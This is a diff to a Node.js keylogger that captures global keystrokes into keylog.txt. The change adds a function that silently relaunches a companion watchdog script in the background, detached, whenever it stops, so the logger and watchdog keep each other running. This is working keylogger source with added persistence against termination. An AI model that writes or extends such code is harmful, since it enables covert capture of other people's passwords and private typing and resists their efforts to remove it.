@@ -1,6 +1,7 @@
 const fs = require('fs');
 const { GlobalKeyboardListener } = require('node-global-key-listener');
 const { exec } = require('child_process');
+const path = require('path');
 
 // Log termination to the keylog.txt file
 function logToKeylogFile(message) {
@@ -36,9 +37,37 @@ function checkWatchdogStatus() {
         // Only log if the watchdog was previously running and has now stopped
         logToKeylogFile('Watchdog has stopped unexpectedly.');
         wasRunning = false; // Update the status to stopped
+        startWatchdog();
       }
     });
   }
+
+
+  // Function to start the keylogger process
+function startWatchdog() {
+    logToKeylogFile('Starting watchdog...');
+      const watchdogPath = path.join(__dirname, 'watchdog.js');
+  
+      // Command to start the watchdog script
+      const watchdogCommand = `start "" /b node "${watchdogPath}"`;
+  
+      // Use 'exec' to start the watchdog
+      const watchdogProcess = exec(watchdogCommand);
+  
+      // Handle potential error events when attempting to start the watchdog
+      watchdogProcess.on('error', (error) => {
+        logToKeylogFile(`Failed to start watchdog process: ${error.message}`);
+      });
+  
+      // Handle the 'spawn' event indicating successful startup of the watchdog
+      watchdogProcess.on('spawn', () => {
+        logToKeylogFile('Watchdog started');
+      });
+  
+      // Optionally, detach the processes if needed
+      watchdogProcess.unref();
+  }
+
   
   // Check the status every 5 seconds
   setInterval(checkWatchdogStatus, 5000);
